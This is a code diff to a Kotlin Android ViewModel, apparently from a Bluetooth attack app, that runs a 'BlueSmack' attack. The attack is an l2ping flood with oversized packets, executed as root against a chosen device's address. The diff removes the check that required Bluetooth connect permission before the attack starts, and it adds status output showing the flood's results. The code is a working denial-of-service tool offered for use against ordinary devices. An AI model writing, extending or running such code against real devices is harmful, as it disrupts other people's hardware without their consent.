@@ -29,7 +29,6 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
 
     private val bluetoothAdapter: BluetoothAdapter? = (application.getSystemService(BluetoothManager::class.java) as BluetoothManager).adapter
 
-    var hasPermissions = false
     init {
         viewModelScope.launch {
             deviceRepository.allDevices.collect {
@@ -42,10 +41,6 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
     }
 
     fun startAttack() {
-        if (!hasPermissions) {
-            _status.value = "Bluetooth connect permission is required"
-            return
-        }
         val selected = _selectedDevice.value ?: return
         ActionLogger.log("BlueSmack attack started against ${selected.macAddress}.")
 
@@ -62,10 +57,10 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
         }
 
         viewModelScope.launch {
-            _status.value = "Starting attack..."
+            _status.value = "Running l2ping flood against ${device.address}... (requires root)"
             val command = "l2ping -i hci0 -s 600 -f ${device.address}"
             val result = RootExecutor.execute(command)
-            _status.value = "Attack finished."
+            _status.value = if (result.isBlank()) "Attack finished." else result.take(200)
         }
     }
 }
